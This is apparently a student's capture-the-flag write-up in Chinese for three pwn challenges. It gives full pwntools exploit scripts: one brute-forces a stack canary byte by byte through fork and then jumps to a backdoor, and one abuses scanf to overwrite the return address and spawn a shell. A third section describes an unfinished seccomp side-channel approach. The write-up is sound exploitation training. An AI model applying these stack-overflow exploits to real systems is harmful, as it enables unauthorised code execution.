# NS24_Week3_CrazyCat_20233001236_刘涵

## 信息
- 平台ID：CrazyCat
- 姓名：刘涵
- 学号：20233001236
- 轮次：Week3
## 解出题目
![[Pasted image 20241013112450.png]]24.10.13
# PWN
## EZcanary
![[Pasted image 20241013112732.png]]
![[Pasted image 20241013112758.png]]
保护除了PIE全开，初步看有循环，进入IDA查看
![[Pasted image 20241013113028.png]]
![[Pasted image 20241013113135.png]]
有后门函数直接使用，把程序的返回地址改为后门函数的地址即可获取shell。现在需要找到方法获取`canary`。
可以发现有`fork`函数创建线程，`fork`函数创建的线程中`canary`的值是不会改变的，那么只需要利用这一特性不停爆破`canary`的值，返回`stack smashing detected` 说明不对，没有返回则说明这一位正确，可爆破出`canary`的值
exp:
```python
from pwn import *

local = False
context.log_level = 'debug'
if local:
    p = process('./ezcanary')
    # pwnlib.gdb.attach(p, 'b *main')
else:
    p = remote('8.147.132.32', 30758)
elf = ELF('./ezcanary')

backdoor = 0x401236

canary = b'\x00'
for i in range(7):
    pause()
    for b in range(256):
        payload = b'a' * (0x50 + 8)+ canary + b.to_bytes(1, 'little')
        print("-------------------------------------\n", payload)
        p.recvuntil(b'\n')
        # 这里复制过来的缩进在markdowm里看着有问题，下面两个recvuntil和print是同级的
        p.recvuntil(b'\xe6\x83\xb3\xe5\xbf\x85\xe6\x88\x91\xe7\x9a\x84\xe7\xa8\x8b\xe5\xba\x8f\xe4\xb8\x80\xe5\xae\x9a\xe5\xbe\x88\xe5\xae\x89\xe5\x85\xa8\xe5\x90\xa7\xce\xb5=\xce\xb5=\xce\xb5=(~\xef\xbf\xa3\xe2\x96\xbd\xef\xbf\xa3)~\n')
        p.recvuntil(b'\xe4\xbd\xa0\xe8\xa7\x89\xe5\xbe\x97\xe5\x91\xa2\xef\xbc\x9f\n')
        p.send(payload)
        time.sleep(0.1)
        a = p.recv()
        if b"stack smashing detected" not in a:
            log.info(f'a: {a}')
            canary += b.to_bytes(1, 'little')
            log.success(f'canary: {canary}')
            if i < 6 :
                p.sendline(b'1')
            else:
                p.sendline(b'cat flag')
            break
        else:
            p.sendline(b'1')
            p.recvuntil(b'(*^_^*)\n')
log.success(f'final_canary: {canary}')
# gdb.attach(p, 'b *0x4013B3')
payload = b'a' * (0x50 + 8) + canary + p64(0) + p64(backdoor)
p.recvuntil(b'\n')
p.sendline(payload)

p.interactive()
```
![[Pasted image 20241013113914.png]]
可以看到最终泄露出来的`canary`

## 不思議なscanf
![[Pasted image 20241013114131.png]]
除了PIE和RELRO全开，打开ida查看
![[Pasted image 20241013114232.png]]
![[Pasted image 20241013114242.png]]
有后门函数，主函数意为循环输入十五次，打开gdb调试查看
![[Pasted image 20241013114454.png]]
![[Pasted image 20241013114502.png]]
输入一个很大的值后发现0x7fffffffdc10位置被修改为0xffffffff，再次输入可以发现同一位置被修改为![[Pasted image 20241013114611.png]]
同时根据scanf函数被调用时的参数![[Pasted image 20241013114633.png]]
可以发现scanf的参数为%d既只能输入int类型的数，否则则会错误并无法输入
![[Pasted image 20241013114803.png]]
多次输入后发现可以慢慢将栈空间覆盖，那么只需要将返回地址覆盖为backdoor的地址即可获取shell，但原程序中的printf函数没有格式化字符串漏洞，所以我们不能泄露栈上的数据，那么需要找到办法使scanf函数输入后不改变栈上的值。经过调试可以发现输入`-`时栈上的值不会被改变![[Pasted image 20241013115045.png]]
![[Pasted image 20241013115052.png]]
根据这个特性即可构造exp。
exp:
```python
from pwn import *
import pwnlib.gdb

context.log_level = 'debug'
local = False
if local:
    p = process('./scanf')
    pwnlib.gdb.attach(p, 'b main')
else:
    p = remote('8.147.132.32', 20300)

backdoor = 0x40123B # 4198971
binsh = 0x402056
system = 0x400527
system_binsh = 0x401261 # 4199009
  

for i in range(10):
	# 这里复制过来的在markdown里看着有问题，下面这个recvuntil应该是在for里面和payload同级
	      p.recvuntil(b'\xe3\x82\x8f\xe3\x81\x9f\xe3\x81\x97\xe3\x80\x81\xe6\xb0\x97\xe3\x81\xab\xe3\x81\xaa\xe3\x82\x8a\xe3\x81\xbe\xe3\x81\x99\xef\xbc\x81')

    payload = '-'

    p.sendline(payload)

p.recvuntil(b'\xe3\x82\x8f\xe3\x81\x9f\xe3\x81\x97\xe3\x80\x81\xe6\xb0\x97\xe3\x81\xab\xe3\x81\xaa\xe3\x82\x8a\xe3\x81\xbe\xe3\x81\x99\xef\xbc\x81')
payload = '4199009'
p.sendline(payload)
p.recvuntil(b'\xe3\x82\x8f\xe3\x81\x9f\xe3\x81\x97\xe3\x80\x81\xe6\xb0\x97\xe3\x81\xab\xe3\x81\xaa\xe3\x82\x8a\xe3\x81\xbe\xe3\x81\x99\xef\xbc\x81')
payload = '0'
p.sendline(payload)

for i in range(4):
	# 这里显示也是有问题，下面这个recvuntil在for里面
    p.recvuntil(b'\xe3\x82\x8f\xe3\x81\x9f\xe3\x81\x97\xe3\x80\x81\xe6\xb0\x97\xe3\x81\xab\xe3\x81\xaa\xe3\x82\x8a\xe3\x81\xbe\xe3\x81\x99\xef\xbc\x81')
    payload = '1'
    p.sendline(payload)

p.interactive()
```
![[Pasted image 20241013115334.png]]
## Easy_Shellcode
虽然这题没做出来，但感觉我的思路应该没错，应该是构造shellcode的水平实在不行。
![[Pasted image 20241013115859.png]]
可以看到仅打开了NX保护
![[Pasted image 20241013115938.png]]
进入主函数可以看到有sandbox，利用seccomp-tools工具查看![[Pasted image 20241013120103.png]]
可以看到这个sandbox限制了除调用编号为257和327以外的其他所有调用函数的使用，这俩调用编号对应的函数是openat和preadv2。然后我们发现我们拥有0xd000000段的所有权限并且构造的shellcode会被放入0xd000721处并被执行，由于execve等被禁止调用，所以这里我们采用orw的方法来获取shell。
orw指的是open,read和write，有由于sandbox限制了一些系统调用，但一般都会有这三个或这三个中的几个，所以我们可以使用open函数直接打开flag文件，用read函数将其读入到栈上或内存空间中，然后使用write函数再打印出来，从而获取flag
但这道题中很显然我们只有or没有w，那么我们就只能用爆破的方法一位一位爆破flag的值，也就是侧信道爆破的方法，将flag的值爆破出来。
在实际操作的过程中遇到的问题是我构造的shellcode并不能将我自己构造的flag读入到指定的位置上，并未能解决
